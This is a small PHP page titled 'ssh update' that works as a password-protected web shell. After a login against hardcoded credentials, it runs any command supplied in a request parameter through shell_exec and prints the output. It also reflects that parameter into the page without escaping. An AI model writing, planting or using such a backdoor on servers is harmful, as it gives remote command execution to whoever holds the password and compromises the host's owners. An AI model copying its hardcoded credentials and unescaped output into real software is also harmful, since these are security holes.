<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ssh 更新</title>
</head>

<body>

<br />
<?php
  session_start();
    if($_POST['submit'])
    {
        $username = $_POST['username'];
        $password = $_POST['password'];

        if($username =='tools' && $password =='sundan123')
        {
            $_SESSION['ssh'] = 1;
        }
    }
if(!empty($_SESSION['ssh'])):
    $ssh = urldecode(trim($_REQUEST['ssh']));

    echo '<pre>';
    echo "$ssh <br />";
    echo empty($ssh)?'No shell.':shell_exec($ssh);
    echo '</pre>';


    ?>
<form action="" >
    <input name="ssh" value="">

    <input type="submit" value="执行">
</form>


    <?php
    else:?>
        <form action="" method="POST">
<input name="username" value="">
            <input name="password" value="">
            <input name="submit" type="submit" value="登陆">
        </form>
        <?php
endif;?>
</body>
</html>